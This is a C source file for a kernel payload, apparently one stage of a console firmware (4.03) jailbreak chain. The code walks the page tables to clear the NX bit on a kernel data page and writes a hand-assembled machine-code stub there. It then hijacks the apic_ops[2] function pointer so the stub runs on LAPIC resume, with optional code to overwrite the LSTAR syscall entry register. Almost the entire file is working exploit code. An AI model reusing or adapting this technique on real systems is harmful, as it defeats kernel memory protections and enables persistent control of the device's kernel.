#include <stdint.h>

/*
 * resume_chain v4 — executable stub in kdata
 *
 * Instead of INT3+IST+ROP, write machine code into kdata, clear the NX bit
 * via page-table walk, and point apic_ops[2] at it.  The stub:
 *   (optional) wrmsr to set LSTAR
 *   restore apic_ops[2] to original get_timer_freq
 *   tail-call get_timer_freq → clean return to LAPIC resume caller
 *
 * Mode (via fw_ver):
 *   0x1: ARM — stub with wrmsr + tail-call get_timer_freq
 *   0x2: READBACK — check sentinel + LSTAR after resume
 *   0x3: ARM_SAFE — no stub, just report (sanity check)
 *   0x4: ARM_NO_WRMSR — stub WITHOUT wrmsr (isolates wrmsr vs mechanism)
 */

#define MAGIC_RSCN       0x5253434E  /* "RSCN" */

/* FW 4.03 offsets */
#define APIC_OPS_OFF_KTEXT  0x1934AC8

/* kdata layout */
#define STUB_OFF         0x900    /* machine code stub */
#define SENTINEL_OFF     0x0F8    /* fired-sentinel */
#define SENTINEL_VAL     0x434841494E464952ULL  /* "CHAINFIR" */

#define MSR_LSTAR        0xC0000082
#define DMAP_BASE        0xFFFF800000000000ULL
#define PTE_NX           (1ULL << 63)
#define PTE_PS           (1ULL << 7)
#define PTE_PRESENT      (1ULL)
#define PTE_PHYS_MASK    0x000FFFFFFFFFF000ULL

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t *)addr;
}

static inline void write8(uint64_t addr, uint64_t val)
{
    *(volatile uint64_t *)addr = val;
}

/*
 * Walk the 4-level page table to clear the NX bit for a given VA.
 * Returns 0 on success, negative on error.  Reports old PTE via *old_pte.
 */
static int clear_nx(uint64_t va, uint64_t *old_pte)
{
    uint64_t cr3;
    __asm__ volatile("mov %%cr3, %0" : "=r"(cr3));

    volatile uint64_t *pml4 = (volatile uint64_t *)(DMAP_BASE + (cr3 & PTE_PHYS_MASK));
    uint64_t pml4e = pml4[(va >> 39) & 0x1FF];
    if (!(pml4e & PTE_PRESENT)) return -1;

    volatile uint64_t *pdp = (volatile uint64_t *)(DMAP_BASE + (pml4e & PTE_PHYS_MASK));
    uint64_t pdpe = pdp[(va >> 30) & 0x1FF];
    if (!(pdpe & PTE_PRESENT)) return -2;
    if (pdpe & PTE_PS) {
        /* 1GB page */
        *old_pte = pdpe;
        pdp[(va >> 30) & 0x1FF] = pdpe & ~PTE_NX;
        goto flush;
    }

    volatile uint64_t *pd = (volatile uint64_t *)(DMAP_BASE + (pdpe & PTE_PHYS_MASK));
    uint64_t pde = pd[(va >> 21) & 0x1FF];
    if (!(pde & PTE_PRESENT)) return -3;
    if (pde & PTE_PS) {
        /* 2MB page */
        *old_pte = pde;
        pd[(va >> 21) & 0x1FF] = pde & ~PTE_NX;
        goto flush;
    }

    volatile uint64_t *pt = (volatile uint64_t *)(DMAP_BASE + (pde & PTE_PHYS_MASK));
    uint64_t pte = pt[(va >> 12) & 0x1FF];
    if (!(pte & PTE_PRESENT)) return -4;
    *old_pte = pte;
    pt[(va >> 12) & 0x1FF] = pte & ~PTE_NX;

flush:
    __asm__ volatile("invlpg (%0)" :: "r"(va) : "memory");
    return 0;
}

int module_start(kproc_args *args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t mode = args->fw_ver;
    volatile uint64_t *out = (volatile uint64_t *)args;
    volatile uint32_t *out32 = (volatile uint32_t *)args;

    for (int i = 0; i < 140; i++)
        out[i] = 0;

    uint64_t lstar = rdmsr(MSR_LSTAR);
    uint64_t ktext_base = lstar - 0x294218;

    uint64_t apic_ops_addr = ktext_base + APIC_OPS_OFF_KTEXT;
    volatile uint64_t *apic = (volatile uint64_t *)apic_ops_addr;
    uint64_t get_timer_freq = apic[19];
    uint64_t orig_apic2 = apic[2];

    out32[0] = MAGIC_RSCN;
    out[1] = kdata_base;
    out[2] = ktext_base;

    if (mode == 0x1 || mode == 0x4) {
        /*
         * ARM MODE — executable stub approach
         *
         * 1. Walk page tables, clear NX on kdata stub page
         * 2. Write machine code stub to kdata + STUB_OFF
         * 3. Point apic_ops[2] at the stub
         *
         * Stub (mode 0x1, with wrmsr):
         *   mov ecx, 0xC0000082       ; MSR_LSTAR
         *   mov eax, <lstar_low>      ; value low 32
         *   mov edx, <lstar_high>     ; value high 32
         *   wrmsr                     ; set LSTAR
         *   movabs r11, <&apic[2]>    ; address of apic_ops[2]
         *   movabs rax, <orig_func>   ; original get_timer_freq
         *   mov [r11], rax            ; restore apic_ops[2]
         *   jmp rax                   ; tail-call → clean return
         *
         * Mode 0x4: same but without the wrmsr prefix (test mechanism).
         */

        uint64_t stub_va = kdata_base + STUB_OFF;
        uint64_t apic2_ptr = apic_ops_addr + 2 * 8;

        /* v1 safe test: write LSTAR back to its current value */
        uint64_t new_lstar = lstar;

        /* Step 1: clear NX on stub page */
        uint64_t old_pte = 0;
        int nx_rc = clear_nx(stub_va, &old_pte);

        /* Step 2: write stub machine code */
        volatile uint8_t *s = (volatile uint8_t *)stub_va;
        int si = 0;

        if (mode == 0x1) {
            /* mov ecx, 0xC0000082 */
            s[si++] = 0xB9;
            s[si++] = 0x82; s[si++] = 0x00; s[si++] = 0x00; s[si++] = 0xC0;
            /* mov eax, <lstar_low> */
            s[si++] = 0xB8;
            s[si++] = (new_lstar)       & 0xFF;
            s[si++] = (new_lstar >> 8)  & 0xFF;
            s[si++] = (new_lstar >> 16) & 0xFF;
            s[si++] = (new_lstar >> 24) & 0xFF;
            /* mov edx, <lstar_high> */
            s[si++] = 0xBA;
            s[si++] = (new_lstar >> 32) & 0xFF;
            s[si++] = (new_lstar >> 40) & 0xFF;
            s[si++] = (new_lstar >> 48) & 0xFF;
            s[si++] = (new_lstar >> 56) & 0xFF;
            /* wrmsr */
            s[si++] = 0x0F; s[si++] = 0x30;
        }

        /* movabs r11, <&apic[2]> — 49 BB <8 bytes LE> */
        s[si++] = 0x49; s[si++] = 0xBB;
        for (int b = 0; b < 8; b++) s[si++] = (apic2_ptr >> (b * 8)) & 0xFF;

        /* movabs rax, <get_timer_freq> — 48 B8 <8 bytes LE> */
        s[si++] = 0x48; s[si++] = 0xB8;
        for (int b = 0; b < 8; b++) s[si++] = (get_timer_freq >> (b * 8)) & 0xFF;

        /* mov [r11], rax — 49 89 03 */
        s[si++] = 0x49; s[si++] = 0x89; s[si++] = 0x03;

        /* jmp rax — FF E0 */
        s[si++] = 0xFF; s[si++] = 0xE0;

        /* Step 3: write sentinel */
        write8(kdata_base + SENTINEL_OFF, SENTINEL_VAL);

        /* Step 4: point apic_ops[2] at our stub */
        apic[2] = stub_va;

        /* Report */
        out[3]  = stub_va;
        out[4]  = (uint64_t)nx_rc;
        out[5]  = old_pte;
        out[6]  = get_timer_freq;
        out[7]  = orig_apic2;
        out[8]  = apic2_ptr;
        out[9]  = new_lstar;
        out[10] = lstar;
        out[11] = (uint64_t)si;     /* stub size in bytes */
        out[12] = kdata_base + SENTINEL_OFF;

        /* Read back first 8 bytes of stub (verify it's readable) */
        out[13] = read8(stub_va);
        out[14] = read8(stub_va + 8);

        out32[1] = 0x0001;

    } else if (mode == 0x2) {
        /* READBACK MODE */

        /* Sentinel */
        uint64_t sentinel = read8(kdata_base + SENTINEL_OFF);
        out[3] = sentinel;
        out[4] = (sentinel == SENTINEL_VAL) ? 1 : 0;

        /* Current LSTAR */
        uint64_t cur_lstar = rdmsr(MSR_LSTAR);
        out[5] = cur_lstar;
        out[6] = (cur_lstar != lstar) ? 1 : 0;  /* changed? */

        /* Current apic_ops[2] */
        out[7] = apic[2];
        out[8] = get_timer_freq;
        out[9] = (apic[2] == get_timer_freq) ? 1 : 0;  /* restored? */

        /* Stub bytes (still there?) */
        out[10] = read8(kdata_base + STUB_OFF);
        out[11] = read8(kdata_base + STUB_OFF + 8);

        /* Restore apic_ops[2] if not already restored */
        if (apic[2] != get_timer_freq) {
            apic[2] = apic[18] - 8;  /* set_tpr - 8 trick */
        }
        out[12] = apic[2];

        out32[1] = 0x0001;

    } else if (mode == 0x3) {
        /* SAFE MODE — just report, no modifications */
        out[3] = get_timer_freq;
        out[4] = orig_apic2;
        out[5] = lstar;
        out[6] = apic_ops_addr;
        out32[1] = 0x0001;

    } else {
        out32[1] = 0xFF;
    }

    out[131] = 0xdeadbeefcafe0040ULL;
    return 0;
}
